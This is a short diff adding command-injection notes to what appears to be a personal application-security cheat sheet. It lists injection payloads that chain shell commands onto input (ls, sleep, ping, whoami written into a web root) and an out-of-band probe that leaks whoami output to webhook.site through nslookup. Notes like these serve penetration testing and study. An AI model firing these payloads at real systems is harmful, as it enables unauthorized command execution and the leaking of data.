@@ -713,3 +713,19 @@ how it works:
 - pass that into a -->  function 
 - the function --> executes it as code
 
+#### Website
+[[cheet#AppSecExplained]]
+#### Basic command injection
+`; ls -la`
+`&& ls -la`
+`; ls -la #`
+`| ls -la`
+```bash
+; sleep 10
+; ping -c 10 127.0.0.1
+& whoami > /var/www/html/whoami.txt &
+```
+
+```bash
+& nslookup webhook.site/<id>?`whoami` &     -->  out of band testing
+```
